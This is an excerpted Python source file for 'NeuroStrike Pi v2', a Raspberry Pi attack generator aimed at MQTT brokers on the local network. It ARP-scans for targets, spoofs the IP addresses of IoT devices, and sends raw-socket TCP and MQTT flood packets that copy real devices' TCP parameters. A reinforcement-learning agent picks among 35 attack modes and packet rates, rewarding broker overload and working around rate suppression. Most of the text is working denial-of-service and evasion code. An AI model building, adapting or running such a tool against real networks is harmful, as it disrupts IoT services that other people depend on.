...
Changes from v2 FINAL:
  ...
  - RTO tracking: RFC 6298 SRTT/RTTVAR/RTO computed every 10 probes
    File 1 (rtt_window.json)  : rolling 10-probe RTT window — overwritten each cycle
  ...
  - HIGH SPEED SENDER: AF_PACKET raw socket replaces Scapy send()
    ...
    AF_PACKET persistent socket = 5,000–50,000 PPS
...
All previous fixes retained:
  Fix B — throughput_ratio in state (soft mitigation signal)
  Fix C — mode-stuck guard
  Fix 1 — full TCP blind handshake before MQTT payload (now via raw socket)
  Fix 2 — TCP probe thread (kernel socket connect from PI_IP)
  Fix 3 — capture-accurate TCP parameters (MSS, TTL, windows from discovered devices)
  Fix 4 — per-mode reward history on dashboard
  Fix 5 — 35 attack modes (5 pure + 30 blended)

State vector   : 35 mode one-hot + 9 numeric features = 44 dims
Action space   : 35 modes × 3 PPS deltas = 105 actions
...
RL_PATH        = "/home/pi/neurostrike_2/rl_weights.pkl"
RTT_WINDOW_PATH = "/home/pi/neurostrike_2/rtt_window.json"
RTO_LOG_PATH   = "/home/pi/neurostrike_2/rto_log.jsonl"
...
BROKER_PORT       = 1883
MAX_PPS           = 300   # raw AF_PACKET socket ceiling
MIN_PPS           = 50     # minimum rate — below this RL has no meaningful signal
...
DISCOVER_INTERVAL = 0      # scan once at startup only — periodic scan disrupts connections
...
class NetworkDiscovery:
    ...
    Results are locked in for the session — no periodic rescanning
    ...
    def _scan(self):
        ...
        iot = [h for h in hosts if h != pi_ip and h != broker]
    ...
    def get_spoof_ip(self):
        ...
        with self._lock:
            ...
            # No IoT devices found — spoof a plausible IP on the same subnet
            if self.pi_ip:
...
class RTOTracker:
    ...
    signal — as the broker becomes overwhelmed, failed connect() calls
...
# ============================================================================
# BROKER PROBE — kernel socket connect() from Pi's real IP
# ============================================================================
...
class BrokerProbe:
    ...
    TIMEOUT  = 0.5   # lowered from 2.0 — faster failure detection, more RTO samples
    ...
    def _loop(self):
        while True:
            ...
            with self._l:
                ...
                # meaningful stress signal — broker taking 2000ms to reject
...
# Scapy send() opens/closes a raw socket per call → ~25 PPS on Pi 5.
# AF_PACKET with a persistent socket → 5,000–50,000 PPS on Pi 5.
#
...
# AF_PACKET raw sockets — unlike IPPROTO_RAW which fakes the IP header).
# ============================================================================
...
def _tcp_hdr(src_ip: str, dst_ip: str,
    ...
    data_off = (5 + len(options) // 4) << 4   # header length in 32-bit words
...
# MSS option bytes for SYN packets
_MSS_OPT = struct.pack('!BBH', 2, 4, ESP32_MSS) + b'\x01\x01'  # MSS + NOP + NOP

# Persistent raw socket — opened once, reused for every packet
_raw_sock = None
...
def _build_frame(src_mac: bytes, dst_mac: bytes,
    ...
    eth  = src_mac + dst_mac + b'\x08\x00'   # EtherType IPv4
    return eth + ip + tcp
...
def send_packet(row, attack_name: str, iface: str):
    ...
    Bypasses Scapy's per-call socket overhead — achieves 5k-50k PPS vs 25 PPS.
    """
    global _pi_mac, _broker_mac
    ...
    try:
        ...
        # ── All other MQTT attacks (blind 3-packet handshake) ─────────────────
...
class RLAgent:
    ...
    def reward(self, fb, cf, broker_up):
        if not broker_up: return R_NO_BROKER
        acks = fb.get("acks", 0); rsts = fb.get("rsts", 0); icmps = fb.get("icmps", 0)
...
def rl_t(st: State, agent: RLAgent, fb: ProbeBasedFeedback, probe: BrokerProbe):
    ...
    while True:
        ...
        with st.lock:
            on  = st.on; rl = st.rl_on; mi = st.mode_idx
            pps = st.tgt_pps; cf = st.cf
            tim = time.time() - st._mode_t
            b_up = st.broker_up; tput = st.throughput_ratio

        if not on: continue

        snap = fb.snap()
        if not snap.get("ok", snap["acks"] > 0):
            with st.lock: st.cf += 1; cf = st.cf
        else:
            with st.lock: st.cf = 0;  cf = 0

        rew  = agent.reward(snap, cf, b_up)
        s    = agent.encode(mi, pps, snap, cf, tim, b_up, tput)
        ...
        if rl:
            nm  = ALL_MODES[new_mi]; rsn = []
            if new_mi != mi:
                src_str = "FORCED" if agent._forced_switch else \
                          ("Pure" if nm["type"] == "pure" else "Blend")
                rsn.append(f"{src_str} → {nm['label'][:28]}")
            if pps_d != 0: rsn.append(f"PPS {'↑' if pps_d > 0 else '↓'}{new_pps}")
            if not b_up:   rsn.append("BROKER DOWN")
            if tput < 0.6: rsn.append(f"SUPPRESSED tput={tput:.2f}")
            probe_rate = snap.get("success_rate", 1.0)
            if probe_rate < 0.5 and b_up: rsn.append(f"PROBE {probe_rate*100:.0f}% ok")
            if not rsn: rsn.append("Hold")

            with st.lock:
                if new_mi != mi: st._mode_t = time.time()
                st.mode_idx   = new_mi; st.tgt_pps = new_pps
                st.rl_rew     = rew;    st.rl_eps  = agent.eps
                st.rl_step    = agent.step
                st.rl_act     = f"M{new_mi} P{'+' if pps_d > 0 else ''}{pps_d}"
                st.rl_rsn     = " | ".join(rsn)
                st.rl_acks    = snap["acks"]; st.rl_rsts = snap["rsts"]
                st.rl_loss    = agent.avg_l(); st.rl_forced = agent._forced_switch
                st.top_modes  = top

        now = time.time()
        if now - last_save > SAVE_INTERVAL:
            agent.save(RL_PATH); last_save = now
...
def dashboard(scr, st: State, agent: RLAgent, mc: ModelCache, rto: RTOTracker):
    ...
    while True:
        ...
        if   k == ord(' ') and now - lk > 0.2:
            ...
            # Manual network rescan — only trigger when attack is OFF
        ...
        s(ln, 0, sep, C); ln += 1
        tt = "NeuroStrike Pi v2 DYNAMIC — Attack Generator + RL"
        ...
        s(ln, 0, f"  MODES  Page {page+1}/{NP}  [↑↓] select  [N/P] page", Y); ln += 1
        ...
        for i in range(si, ei):
            ...
            s(ln, 0, f"  [{i:02d}]{'▶' if i == mi else ' '}[{tp}] {m['label'][:34]}",
              G if i == mi else W)
        ...
        if tput < 0.6: s(ln, 40, "← SUPPRESSED", R)
        ln += 1
        s(ln, 0, f"  Session Time  : {int(elaps):>8}s", W); ln += 2

        s(ln, 0, dsh, W); ln += 1
        s(ln, 0, "RL AGENT", M); ln += 1
        s(ln, 0, f"  Step : {rl_step:>6}  ε={rl_eps:.3f}  Loss={rl_loss:.4f}  State={STATE_DIM}d", W); ln += 1
        ...
        s(ln, 0, dsh, W); ln += 1
        s(ln, 0, "  [SPACE] ON/OFF  [↑↓] Mode  [N/P] Page  [+/-] Rate  [R] RL  [D] Rescan  [Q] Quit", Y)
        try:
...
def main():
    print("=" * 70)
    print("NeuroStrike Pi v2 DYNAMIC — Attack Generator + RL")
    print("=" * 70)
    print("  Starting network discovery (ARP scan)...")

    disc.start()
    if not disc.wait_ready(timeout=30):
        print("  ⚠️  Network discovery timed out — continuing with no targets")
    else:
        dstat = disc.status()
    ...
    if not disc.broker_ip:
        print("\n  ⚠️  No MQTT broker found on local network.")
    ...
    print(f"  Actions   : {N_ACTIONS}  ({N_MODES} modes × {N_PPS_ACT} PPS deltas)")
    ...
    if agent.load(RL_PATH):
        print(f"  ✓ RL weights loaded  step={agent.step}  ε={agent.eps:.3f}")
    else:
        print("  ℹ  Fresh RL agent — starting from scratch")
